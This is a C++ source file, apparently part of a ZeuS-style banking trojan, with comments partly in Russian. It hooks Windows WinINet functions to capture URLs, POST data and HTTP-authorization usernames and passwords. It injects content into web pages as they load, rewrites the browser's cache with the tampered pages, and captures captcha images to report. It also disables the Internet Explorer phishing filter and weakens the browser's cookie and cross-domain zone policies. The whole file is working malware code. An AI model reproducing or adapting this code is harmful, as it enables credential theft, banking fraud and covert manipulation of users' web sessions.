#include <windows.h>
#include <shlobj.h>
#include <wininet.h>
#include <urlmon.h>
#include <intrin.h>

#include "defines.h"
#include "DllCore.h"

#include "cryptedstrings.h"
#include "wininethook.h"
#include "dllconfig.h"
#include "report.h"
#include "httpgrabber.h"
#include "winapitables.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\sync.h"
#include "..\common\fs.h"
#include "..\common\wininet.h"
#include "..\common\comlibrary.h"

#include "..\common\debug.h"
#include "..\common\registry.h"
#include "..\common\process.h"

#if defined _WIN64
#define CACHE_LINE 64
#else
#define CACHE_LINE 32
#endif

#define CACHE_ALIGN __declspec(align(CACHE_LINE))

////////////////////////////////////////////////////////////////////////////////////////////////////
// Таблица соединений.
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
	HINTERNET handle;                     //Хэндл соединения.
	HANDLE readEvent;                     //События чтения (при инжекте).

	HttpGrabber::INJECTFULLDATA *injects; //Список ижектов, применяемых для соединения.
	DWORD injectsCount;                   //Кол. элементов в injects.

	LPBYTE context;                       //Подмененное содержимое.
	DWORD contentSize;                    //Размер содержимого. Если равно ((DWORD)-1), то данные есче не считаны.
	DWORD contentPos;                     //Позиция в содержимом.

	bool bCaptcha;                        // indicates if request is for captcha or not
	bool bIsCaptchaSent;                  // indicates if bot already sent current captcha to server

}WININETCONNECTION;

struct connectionNode
{
	WININETCONNECTION wininetconn;
	CACHE_ALIGN connectionNode *next;
};
struct connectionsList
{
	CACHE_ALIGN DWORD connectionsCount;
	CACHE_ALIGN connectionNode *firstConnection;
};

static connectionsList connections;
static CRITICAL_SECTION connectionsCs;

/*
	Connection search in linked-list.

	IN handle  - handle.

	Return - pointer to connection, NULL - not found.
*/

static WININETCONNECTION * connectionFind(HINTERNET handle)
{
	WININETCONNECTION *wcret = NULL;
	connectionNode *currentNode;
	
	_ReadWriteBarrier();
	CWA(kernel32, EnterCriticalSection)(&connectionsCs);
	if (handle != NULL)
	{
		currentNode = connections.firstConnection;	
		while (currentNode)
		{
			if (currentNode->wininetconn.handle == handle)
			{
				wcret = &currentNode->wininetconn;
				break;
			}
			currentNode = currentNode->next;
		}
	}
	_ReadWriteBarrier();
	CWA(kernel32, LeaveCriticalSection)(&connectionsCs);	
	
	return wcret;
}


/*
	Add new connection to linked list

	IN handle

	Return - pointer to connection, NULL - can't add new connection
*/
static WININETCONNECTION * connectionAdd(HINTERNET handle)
{
	WININETCONNECTION *newConnection = NULL;
	connectionNode *newNode;
	
	if(handle == NULL)return newConnection;
	
	// Is Mem::Alloc returns aligned pointer?
	newNode = (connectionNode *)Mem::alloc(sizeof(connectionNode));
	if(newNode)
		newConnection = &newNode->wininetconn;
		
	//Заполняем.
	if(newConnection != NULL)
	{
		newConnection->handle         = handle;
		newConnection->readEvent      = CWA(kernel32, CreateEventW)(NULL, FALSE, FALSE, NULL);
		newConnection->injects        = NULL;
		newConnection->injectsCount   = 0;
		newConnection->context        = NULL;
		newConnection->contentSize    = (DWORD)-1;
		newConnection->contentPos     = 0;
		newConnection->bCaptcha       = false;
		newConnection->bIsCaptchaSent = false;
		
		_ReadWriteBarrier();

		InterlockedIncrement((LONG *)&connections.connectionsCount);
		CWA(kernel32, EnterCriticalSection)(&connectionsCs);
		if (connections.firstConnection)
		{
			// add to end of list
			connectionNode *currentNode = connections.firstConnection;
			while (currentNode->next) currentNode = currentNode->next;
			currentNode->next = newNode;
		}
		else connections.firstConnection = newNode;	

		_ReadWriteBarrier();
		CWA(kernel32, LeaveCriticalSection)(&connectionsCs);		
	}  
	return newConnection;
}

/*
	Try to find connections in linked-list, and add to list if handle not found

	IN handle.

	Return - pointer to connection, NULL - can't add new connection
*/
static WININETCONNECTION * connectionFindEx(HINTERNET handle)
{
	WININETCONNECTION * wc = connectionFind(handle);
	if(!wc) wc = connectionAdd(handle);
	return wc;
}

/*
	Remove connection from linked list

	IN oldConnection - wininetconnection for removing from linked list.
*/
static void connectionRemove(WININETCONNECTION *oldConnection)
{
	connectionNode *prevNode = NULL;
	
	_ReadWriteBarrier();

	CWA(kernel32, EnterCriticalSection)(&connectionsCs);
	connectionNode *currentNode = connections.firstConnection;	
	while (currentNode)
	{
		if (&currentNode->wininetconn == oldConnection)
		{
		    if (!prevNode)
			{
				if (currentNode->next)
					connections.firstConnection = currentNode->next;
				else
					connections.firstConnection = NULL;
			}
			else
				prevNode->next = currentNode->next;
			break;
		}
		prevNode = currentNode;
		currentNode = currentNode->next;
	}

	_ReadWriteBarrier();

	CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
	InterlockedDecrement((LONG *)&connections.connectionsCount);
	
	oldConnection->handle = NULL;
	CWA(kernel32, CloseHandle)(oldConnection->readEvent);
	HttpGrabber::_freeInjectFullDataList(oldConnection->injects, oldConnection->injectsCount);
	Mem::free(oldConnection->context);
	
	Mem::free(currentNode);
}

////////////////////////////////////////////////////////////////////////////////////////////////////
static DWORD WINAPI initIE(void)
{
	if(coreDllData.integrityLevel > Process::INTEGRITY_LOW)
	{
		//Отключение фишинг фильтра.
		{
			CSTR_GETW(key, regpath_ie_phishingfilter);
			CSTR_GETW(var1, regvalue_ie_phishingfilter1);
			CSTR_GETW(var2, regvalue_ie_phishingfilter2);
			CSTR_GETW(var3, regvalue_ie_phishingfilter3);

			const LPWSTR vars[] = {var1, var2, var3};
			for(BYTE i = 0; i < sizeof(vars) / sizeof(LPWSTR); i++)if(Registry::_getValueAsDword(HKEY_CURRENT_USER, key, vars[i]) != 0)Registry::_setValueAsDword(HKEY_CURRENT_USER, key, vars[i], 0);
		}

		//Internet zones setup.
		{
			HRESULT comResult;
			DWORD dwValue = 0;
			const DWORD actions[] = {URLACTION_CROSS_DOMAIN_DATA, URLACTION_HTML_MIXED_CONTENT, URLACTION_COOKIES, URLACTION_COOKIES_ENABLED,
				URLACTION_COOKIES_SESSION, URLACTION_COOKIES_THIRD_PARTY, URLACTION_COOKIES_SESSION_THIRD_PARTY};
			if(ComLibrary::_initThread(&comResult))
			{
				IInternetZoneManager *zoneMgr = (IInternetZoneManager *)ComLibrary::_createInterface(CLSID_InternetZoneManager, IID_IInternetZoneManager);
				if (zoneMgr)
				{
					for(BYTE a = 0; a < sizeof(actions) / sizeof(DWORD); a++) 
					{
						// URLZONE_LOCAL_MACHINE = 0
						for(DWORD dwZone = 0; dwZone < 5; dwZone++)
						{
							zoneMgr->GetZoneActionPolicy(dwZone, actions[a], (BYTE*)&dwValue, sizeof(DWORD), URLZONEREG_DEFAULT);
							if (dwValue != URLPOLICY_ALLOW)
							{
								dwValue = URLPOLICY_ALLOW;
								zoneMgr->SetZoneActionPolicy(dwZone, actions[a], (BYTE*)&dwValue, sizeof(DWORD), URLZONEREG_DEFAULT);
							}
						}
					}
					zoneMgr->Release();
				}
				ComLibrary::_uninitThread(comResult);
			}
		}

	}
	return 0;
}
void WininetHook::init(void)
{
	InterlockedExchangePointer((PVOID *)&connections.firstConnection, (PVOID)NULL);
	InterlockedExchange((LONG *)&connections.connectionsCount, 0);	
	
	CWA(kernel32, InitializeCriticalSection)(&connectionsCs);

	Process::_createThread(NULL, (LPTHREAD_START_ROUTINE)initIE, NULL);
}

void WininetHook::uninit(void)
{

}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Инжекты.
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
	Установка хука на InternetStatusCallback для хэндла и его родителей.

	IN handle - HINTERNET.
	IN hooker - функция-перехватчик с прототипом InternetStatusCallbacks.
*/
static void hookInternetStatusCallbacks(HINTERNET handle, void *hooker)
{
	HINTERNET parentHandle;
	DWORD size;
	BOOL ok;
	void *callback;

	for(;;)
	{
		size = sizeof(void *);
		if(CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_CALLBACK, &callback, &size) != FALSE)
		{
			//FIXME:
		}

		//Получаем родителя.
		size = sizeof(HINTERNET);
		ok   = CWA(wininet, InternetQueryOptionA)(handle, INTERNET_OPTION_PARENT_HANDLE, &parentHandle, &size);
		if(ok == FALSE || parentHandle == NULL)break;
		handle = parentHandle;
	}
}

#define READCONTEXT_BUFFER_SIZE 4096 //Буфер чтения для readAllContext().

/*
	Кэллбэк для readAllContext().
*/
static void CALLBACK readAllContextCallback(HINTERNET internet, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength)
{
	if(internetStatus == INTERNET_STATUS_REQUEST_COMPLETE || internetStatus == INTERNET_STATUS_CONNECTION_CLOSED)
	{
		WININETCONNECTION *wc = connectionFind(internet);
		if(wc)
			CWA(kernel32, SetEvent)(wc->readEvent);
#if(BO_DEBUG > 0) && defined WDEBUG1
		else WDEBUG1(WDDT_INFO, "Unknown request=0x%p.", internet);
#endif
	}
}

/*
	Чтение всего контекста в буфер.

	IN request      - запрос.
	IN readEvent    - событие ассоциированое с соединением.
	OUT context     - буфер.
	OUT contentSize - размер буфера.

	Retrun          - true - в случаи успеха,
	false - в случаи ошибки.
*/
static bool readAllContext(HINTERNET request, HANDLE readEvent, LPBYTE *context, LPDWORD contentSize)
{
	INTERNET_STATUS_CALLBACK oldCallback;
	LPBYTE buffer;

	//Создаем основные объекты.
	{
		CWA(kernel32, ResetEvent)(readEvent); //Параноя.

		if((buffer = (LPBYTE)Mem::alloc(READCONTEXT_BUFFER_SIZE)) == NULL)
		{
			Mem::free(buffer);
			return false;
		}

		//Подменяем данные соединения.
		{  
			DWORD size = sizeof(DWORD_PTR);
			oldCallback = CWA(wininet, InternetSetStatusCallback)(request, readAllContextCallback);
		}

		*context     = NULL;
		*contentSize = 0;
	}

	//Читаем.
	bool ok = true;
	{
		INTERNET_BUFFERSA internetBuffer;

		Mem::_zero(&internetBuffer, sizeof(INTERNET_BUFFERSA));
		internetBuffer.dwStructSize = sizeof(INTERNET_BUFFERSA);
		internetBuffer.lpvBuffer    = buffer;

		for(;;)
		{
			internetBuffer.dwBufferLength = READCONTEXT_BUFFER_SIZE;
			if(CWA(wininet, InternetReadFileExA)(request, &internetBuffer, IRF_NO_WAIT, 0) == FALSE)
			{
				if(CWA(kernel32, GetLastError)() == ERROR_IO_PENDING)
				{
					/*
						Вообщем это место является больным, т.к. в этот преуд программа этажом выше просто
						сбивает нашу readAllContextCallback(). И мы не когда не получем сигнал от события.
						Нужно найти способ избваиться от InternetSetStatusCallback().
					*/
					Sync::_waitForMultipleObjectsAndDispatchMessages(1, &readEvent, false, INFINITE);
					continue;
				}

				ok = false;
				break;
			}

			//Весь контекст прочитан.
			if(internetBuffer.dwBufferLength == 0)break;

			//Выделяем память
			if(!Mem::reallocEx(context, *contentSize + internetBuffer.dwBufferLength))
			{
				ok = false;
				break;
			}

			//Копируем.
			Mem::_copy(*context + *contentSize, buffer, internetBuffer.dwBufferLength);
			*contentSize += internetBuffer.dwBufferLength;
		}
	}

	//Уничтожаем основные объекты.
	{
		CWA(wininet, InternetSetStatusCallback)(request, oldCallback == INTERNET_INVALID_STATUS_CALLBACK ? NULL : oldCallback);
		Mem::free(buffer);
		if(ok == false)Mem::free(*context);
	}

	return ok;
}

/*
	Операции производимые в момент чтения HTTP-ответа.

	IN OUT request         - хэндл запроса.
	OUT buffer             - буфер для считаных данных. NULL - для возврата достпуного размера.
	IN numberOfBytesToRead - размер буфера.
	OUT numberOfBytesRead  - кол. прочитаных байт.

	Return                 - (-1) - вызвать стандартную функцию чтения.
	В другом случаи, вернуть вместо вызова стандартной функции, это значение.
*/
static int onInternetReadFile(HINTERNET *request, void *buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesRead)
{
	int retVal = -1;
	WININETCONNECTION *wc = connectionFind(*request);

	if(wc && wc->bCaptcha)
	{
		// read data first
		if(numberOfBytesRead != NULL)*numberOfBytesRead = 0;

		if(wc->contentSize == (DWORD)-1)
		{
			LPBYTE contextBuffer;
			DWORD contextBufferSize;

			bool ok;
			{
				HANDLE readEvent = wc->readEvent;
				ok = readAllContext(*request, readEvent, &contextBuffer, &contextBufferSize);
			}

			//Переполучаем данные соединения.
			if(ok == false || !wc)
			{
				if(ok)Mem::free(contextBuffer);
				retVal = (int)FALSE;
				CWA(kernel32, SetLastError)(ERROR_INTERNET_INTERNAL_ERROR);
			}
			else
			{
				wc->context     = contextBuffer;
				wc->contentSize = contextBufferSize;
			}
		}

		if(wc->contentSize != (DWORD)-1 && retVal == -1)
		{
			// capture our data
			DWORD maxSize = wc->contentSize - wc->contentPos;
			DWORD tmp;

			if (wc->bIsCaptchaSent == false)
			{
#if defined WDEBUG1
				WDEBUG1(WDDT_INFO, "Read whole captcha, size: %d", wc->contentSize);
#endif

				WCHAR file[MAX_PATH];
				file[0] = 0;
				CSTR_GETW(decodedString, captcha_filename_format);

				LPSTR content = Wininet::_queryInfoExA(wc->handle, HTTP_QUERY_CONTENT_TYPE, &tmp, NULL);

				if(content)
				{
					// cant check just for image/*, and use '*' for extention, coz there might be some crap...
					if(CSTR_EQNA(content, CryptedStrings::len_captcha_mimetype_png -1, captcha_mimetype_png))
					{
						CSTR_GETW(ext, captcha_png);
						Str::_sprintfW(file, sizeof(file) / sizeof(WCHAR), decodedString, Crypt::mtRandRange(0, 0xFFFF), ext);
					}
					if(CSTR_EQNA(content, CryptedStrings::len_captcha_mimetype_gif - 1, captcha_mimetype_gif))
					{
						CSTR_GETW(ext, captcha_gif);
						Str::_sprintfW(file, sizeof(file) / sizeof(WCHAR), decodedString, Crypt::mtRandRange(0, 0xFFFF), ext);
					}
				}

				if(file[0] == 0)
				{
					CSTR_GETW(ext, captcha_jpeg);
					Str::_sprintfW(file, sizeof(file) / sizeof(WCHAR), decodedString, Crypt::mtRandRange(0, 0xFFFF), ext);  // default to jpeg
				}

				if (content)
					Mem::free(content);

				content = Wininet::_queryInfoExA(*request, HTTP_QUERY_CONTENT_ENCODING, &tmp, NULL);
				if(content && CSTR_EQNA(content, CryptedStrings::len_captcha_encoding_gzip -1, captcha_encoding_gzip))
				{
					CSTR_GETW(ext, captcha_gzip);
					Str::_catW(file, ext, -1);
				}

				if (content)
					Mem::free(content);

				Report::writeCaptcha(file, wc->context + wc->contentPos, maxSize);

				wc->bIsCaptchaSent = true;
			}

			wc->bCaptcha = false;

			// write it to real buffer
			if(maxSize > 0)
			{
				if(buffer == NULL)numberOfBytesToRead = Crypt::mtRandRange(4096, 8192);
				if(numberOfBytesToRead < maxSize)
				{
					// Can't write whole file because buffer is too small
					// so it will get called again to copy rest part of file, that's why we set bCaptcha to true
					maxSize = numberOfBytesToRead;
					wc->bCaptcha = true;
				}

				if(buffer != NULL)
				{
					Mem::_copy(buffer, wc->context + wc->contentPos, maxSize);
					wc->contentPos += maxSize;
				}
			}

			if(numberOfBytesRead != NULL)*numberOfBytesRead = maxSize;
			retVal = 1; // return success, dont call real read...
		}

		return retVal;
	}

	if(wc && wc->injectsCount > 0)
	{
		{
			if(numberOfBytesRead != NULL)*numberOfBytesRead = 0;

			//Инжект еще не применен.
			if(wc->contentSize == (DWORD)-1)
			{
				LPBYTE contextBuffer;
				DWORD contextBufferSize;

				//Читаем и подменяем содержимое.
				bool ok;
				{
					HANDLE readEvent = wc->readEvent;
					ok = readAllContext(*request, readEvent, &contextBuffer, &contextBufferSize);
				}

				//Переполучаем данные соединения.
				if(ok == false || !wc)
				{
					if(ok)Mem::free(contextBuffer);
					retVal = (int)FALSE;
					CWA(kernel32, SetLastError)(ERROR_INTERNET_INTERNAL_ERROR);
				}
				else
				{
					DWORD urlSize;
					LPSTR url = (LPSTR)Wininet::_queryOptionExA(*request, INTERNET_OPTION_URL, &urlSize);
					if(HttpGrabber::_executeInjects(url, &contextBuffer, &contextBufferSize, wc->injects, wc->injectsCount))
					{
						//Подменяем кэш.              
						LPWSTR urlW = Str::_ansiToUnicodeEx(url, urlSize);
						if(urlW != NULL)
						{
							DWORD cacheSize = 4096;
							INTERNET_CACHE_ENTRY_INFOW *cacheEntry = (INTERNET_CACHE_ENTRY_INFOW *)Mem::alloc(cacheSize);

							if(cacheEntry != NULL)
							{
								cacheEntry->dwStructSize = sizeof(INTERNET_CACHE_ENTRY_INFOW);
								if(CWA(wininet, GetUrlCacheEntryInfoW)(urlW, cacheEntry, &cacheSize) && cacheEntry->lpszLocalFileName && *cacheEntry->lpszLocalFileName != 0)
								{
									Fs::_saveToFile(cacheEntry->lpszLocalFileName, contextBuffer, contextBufferSize);
#if defined WDEBUG2
									WDEBUG2(WDDT_INFO, "Changed local cache urlW=\"%s\", cacheEntry->lpszLocalFileName=\"%s\"", urlW, cacheEntry->lpszLocalFileName);
#endif
								}
								Mem::free(cacheEntry);
							}
							Mem::free(urlW);
						}
					}
					Mem::free(url);

					wc->context     = contextBuffer;
					wc->contentSize = contextBufferSize;
				}
			}

			//Инжект применены, отдаем его результаты.
			if(wc->contentSize != (DWORD)-1 && retVal == -1)
			{
				DWORD maxSize = wc->contentSize - wc->contentPos;
				if(maxSize > 0)
				{
					if(buffer == NULL)numberOfBytesToRead = Crypt::mtRandRange(4096, 8192);
					if(numberOfBytesToRead < maxSize)maxSize = numberOfBytesToRead;

					if(buffer != NULL)
					{
						Mem::_copy(buffer, wc->context + wc->contentPos, maxSize);
						wc->contentPos += maxSize;
					}
				}

				if(numberOfBytesRead != NULL)*numberOfBytesRead = maxSize;
				retVal = (int)TRUE;
			}
		}
	}

	return retVal;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Граббер.
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
	Заполнение HttpGrabber::REQUESTDATA.

	OUT requestData - структура.
	IN request      - хэндл текущего запроса.
	IN postData     - POST-данные.
	IN postDataSize - размер POST-данных.

	Return          - true - в случуи успеха,
	false - в случаи ошибки.
*/
static bool fillRequestData(HttpGrabber::REQUESTDATA *requestData, HINTERNET request, const void *postData, DWORD postDataSize)
{
	Mem::_zero(requestData, sizeof(HttpGrabber::REQUESTDATA));

	requestData->flags = HttpGrabber::RDF_WININET; 

	//Хэндл запроса.
	requestData->handle = (void *)request;

	//Получем URL.
	if((requestData->url = (LPSTR)Wininet::_queryOptionExA(request, INTERNET_OPTION_URL, &requestData->urlSize)) == NULL)
	{
#   if defined WDEBUG0
		WDEBUG0(WDDT_ERROR, "Wininet::_queryOptionExA failed.");
#   endif
		return false;
	}

	//Получем реферера.
	requestData->referer = Wininet::_queryInfoExA(request, HTTP_QUERY_REFERER | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->refererSize, NULL);

	//Получем Verb.
	{
		char verb[10];
		DWORD verbSize = sizeof(verb) / sizeof(char) - 1;
		if(CWA(wininet, HttpQueryInfoA)(request, HTTP_QUERY_REQUEST_METHOD, verb, &verbSize, NULL) == TRUE && verbSize > 1)
		{
			if(verb[0] == 'P' && verbSize == 4)requestData->verb = HttpGrabber::VERB_POST;
			else if(verb[0] == 'G' && verbSize == 3)requestData->verb = HttpGrabber::VERB_GET;
			else
			{
#if defined WDEBUG0
				WDEBUG0(WDDT_ERROR, "Unknown verb.");
#endif
				return false;
			}
		}
	}

	//Получем Content-Type.
	requestData->contentType = Wininet::_queryInfoExA(request, HTTP_QUERY_CONTENT_TYPE | HTTP_QUERY_FLAG_REQUEST_HEADERS, &requestData->contentTypeSize, NULL);

	//Получаем POST-данные.
	if(postDataSize > 0 && postDataSize <= HttpGrabber::MAX_POSTDATA_SIZE && postData != NULL)
	{
		requestData->postData     = (void *)postData;
		requestData->postDataSize = postDataSize;
	}

	//Получаем данные авторизации.
	{
		bool ok = false;
		DWORD size;
		LPWSTR userName = (LPWSTR)Wininet::_queryOptionExW(request, INTERNET_OPTION_USERNAME, &size);

		if(userName != NULL && *userName != 0)
		{
			LPWSTR password = (LPWSTR)Wininet::_queryOptionExW(request, INTERNET_OPTION_PASSWORD, &size);
			if(password != NULL && *password != 0)
			{
				requestData->authorizationData.userName = userName;
				requestData->authorizationData.password = password;
				ok = true;
			}
			if(!ok)Mem::free(password);
		}
		if(!ok)Mem::free(userName);
	} 
	
	//Текущая конфигурация.
	requestData->currentConfig = coreDllData.currentConfig;
	return true;
}

/*
	Операции производимые в момент отправки HTTP-запроса.

	IN request          - запрос.
	IN OUT postData     - POST-данные.
	IN OUT postDataSize - размер postData.

	Return              - (-1) - вызвать стандартную функцию отсылки запроса.
	В другом случаи, вернуть вместо вызова стандартной функции, это значение.
*/
static int onHttpSendRequest(HINTERNET request, void **postData, LPDWORD postDataSize)
{
	int retVal = -1;
	HttpGrabber::REQUESTDATA requestData;

	if(fillRequestData(&requestData, request, *postData, *postDataSize))
	{
		DWORD result = HttpGrabber::analizeRequestData(&requestData);

		{
			WININETCONNECTION *wc = connectionFindEx(request);
			if(wc)
			{
				wc->bCaptcha = result & HttpGrabber::ANALIZEFLAG_URL_CAPTCHA;
				if(wc->bCaptcha) wc->bIsCaptchaSent = false;
			}

			if(result & HttpGrabber::ANALIZEFLAG_URL_INJECT)
			{
				bool addInjects       = true;
				{
					{
						CSTR_GETA(header, wininethook_http_acceptencoding);
						CWA(wininet, HttpAddRequestHeadersA)(request, header, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
					}
					{
						CSTR_GETA(header, wininethook_http_te);
						CWA(wininet, HttpAddRequestHeadersA)(request, header, -1, HTTP_ADDREQ_FLAG_REPLACE);
					}
					{
						CSTR_GETA(header, wininethook_http_ifmodified);
						CWA(wininet, HttpAddRequestHeadersA)(request, header, -1, HTTP_ADDREQ_FLAG_REPLACE);
					}
				}

				if(addInjects == false || !wc)
				{
#if defined WDEBUG0
					WDEBUG0(WDDT_ERROR, "Fatal error.");
#endif          
					HttpGrabber::_freeInjectFullDataList(requestData.injects, requestData.injectsCount);
				}
				else
				{
					//Старые инжекты могу сущестовать, т.к. один запрос можно послать несколько раз.
					HttpGrabber::_freeInjectFullDataList(wc->injects, wc->injectsCount);
					Mem::free(wc->context);

					wc->context     = NULL;
					wc->contentPos  = 0;
					wc->contentSize = (DWORD)-1;

#if(BO_DEBUG > 0) && defined WDEBUG0
					if(wc->injects != NULL)WDEBUG0(WDDT_WARNING, "(wc->injects != NULL) == true");
#endif          

					wc->injects      = requestData.injects;
					wc->injectsCount = requestData.injectsCount;
	
				}
			}
		}
	}

	HttpGrabber::_freeRequestData(&requestData);
	return retVal;
}

#define httpSendRequestBody(postfix) \
{\
	if(DllCore::isActive())\
{\
	if(headersLength != 0 && headers != NULL)\
{\
	CWA(wininet, HttpAddRequestHeaders##postfix)(request, headers, headersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);\
	headersLength = 0;\
	headers       = NULL;\
}\
	\
	int r = onHttpSendRequest(request, &optional, &optionalLength);\
	if(r != -1)return (BOOL)r;\
}\
	return CWA(wininet, HttpSendRequest##postfix)(request, headers, headersLength, optional, optionalLength);\
}

BOOL WINAPI WininetHook::hookerHttpSendRequestW(HINTERNET request, LPWSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength)
{
	httpSendRequestBody(W);
}

BOOL WINAPI WininetHook::hookerHttpSendRequestA(HINTERNET request, LPSTR headers, DWORD headersLength, LPVOID optional, DWORD optionalLength)
{
	httpSendRequestBody(A);
}

#define httpSendRequestExBody(postfix) \
{\
	INTERNET_BUFFERS##postfix tb;\
	\
	if(DllCore::isActive())\
{\
	if(buffersIn == NULL)\
{\
	Mem::_zero(&tb, sizeof(INTERNET_BUFFERS##postfix));\
	tb.dwStructSize = sizeof(INTERNET_BUFFERS##postfix);\
}\
	else\
{\
	Mem::_copy(&tb, buffersIn, sizeof(INTERNET_BUFFERS##postfix));\
	\
	if(tb.dwHeadersLength != 0 && tb.lpcszHeader != NULL)\
{\
	CWA(wininet, HttpAddRequestHeaders##postfix)(request, tb.lpcszHeader, tb.dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);\
	tb.lpcszHeader     = NULL;\
	tb.dwHeadersLength = 0;\
}\
}\
	\
	int r = onHttpSendRequest(request, &tb.lpvBuffer, &tb.dwBufferLength);\
	if(r != -1)return (BOOL)r;\
	buffersIn = &tb;\
}\
	return CWA(wininet, HttpSendRequestEx##postfix)(request, buffersIn, buffersOut, flags, context);\
}

BOOL WINAPI WininetHook::hookerHttpSendRequestExW(HINTERNET request, LPINTERNET_BUFFERSW buffersIn, LPINTERNET_BUFFERSW buffersOut, DWORD flags, DWORD_PTR context)
{
	httpSendRequestExBody(W);
}

BOOL WINAPI WininetHook::hookerHttpSendRequestExA(HINTERNET request, LPINTERNET_BUFFERSA buffersIn, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context)
{
	httpSendRequestExBody(A);
}

BOOL WINAPI WininetHook::hookerInternetCloseHandle(HINTERNET handle)
{
#if defined WDEBUG0
	WDEBUG0(WDDT_INFO, "Called");
#endif

	//Закрытие хэндла прерывает чтение данных из других потоков.
	BOOL r = CWA(wininet, InternetCloseHandle)(handle);

	if(DllCore::isActive())//Возможна небольшая утечка памяти.
	{
		WININETCONNECTION *wc = connectionFind(handle);
		if(wc)
		{
			connectionRemove(wc);
#if defined WDEBUG2
			WDEBUG2(WDDT_INFO, "Connection 0x%p removed from table, current connectionsCount=%u.", handle, connections.connectionsCount);
#endif
		}
	}

	return r;
}

BOOL WINAPI WininetHook::hookerInternetReadFile(HINTERNET handle, LPVOID buffer, DWORD numberOfBytesToRead, LPDWORD numberOfBytesReaded)
{
#if defined WDEBUG0
	WDEBUG0(WDDT_INFO, "Called");
#endif

	if(DllCore::isActive() && buffer != NULL && numberOfBytesToRead > 0 && numberOfBytesReaded != NULL)
	{
		int r = onInternetReadFile(&handle, buffer, numberOfBytesToRead, numberOfBytesReaded);
		if(r != -1)return (BOOL)r;
	}
	return CWA(wininet, InternetReadFile)(handle, buffer, numberOfBytesToRead, numberOfBytesReaded);
}

BOOL WINAPI WininetHook::hookerInternetReadFileExA(HINTERNET handle, LPINTERNET_BUFFERSA buffersOut, DWORD flags, DWORD_PTR context)
{
#if defined WDEBUG0
	WDEBUG0(WDDT_INFO, "Called");
#endif

	if(DllCore::isActive() && buffersOut != NULL && buffersOut->lpvBuffer != NULL && buffersOut->dwBufferLength > 0)
	{
		int r = onInternetReadFile(&handle, buffersOut->lpvBuffer, buffersOut->dwBufferLength, &buffersOut->dwBufferLength);
		if(r != -1)return (BOOL)r;
	}
	return CWA(wininet, InternetReadFileExA)(handle, buffersOut, flags, context);
}

BOOL WINAPI WininetHook::hookerInternetQueryDataAvailable(HINTERNET handle, LPDWORD numberOfBytesAvailable, DWORD flags, DWORD_PTR context)
{
#if defined WDEBUG0
	WDEBUG0(WDDT_INFO, "Called");
#endif

	if(DllCore::isActive()/* && numberOfBytesAvailable != NULL May be NULL.*/)
	{
		int r = onInternetReadFile(&handle, NULL, 0, numberOfBytesAvailable);
		if(r != -1)return (BOOL)r;
	}
	return CWA(wininet, InternetQueryDataAvailable)(handle, numberOfBytesAvailable, flags, context);
}
